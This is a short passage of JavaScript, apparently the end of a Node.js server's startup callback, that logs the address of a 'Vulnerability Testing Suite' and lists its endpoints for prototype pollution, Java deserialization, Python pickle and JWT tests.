    console.log(`🚀 Node.js Vulnerability Testing Suite listening at http://localhost:${port}`);
    console.log(`📊 Prototype Pollution endpoint: POST /prototype_pollution`);
    console.log(`☕ Java Deserialization endpoints: /java/*`);
    console.log(`🐍 Python Pickle endpoints: POST /pickle`);
    console.log(`🔐 JWT Vulnerabilities endpoints: POST /jwt`);
});
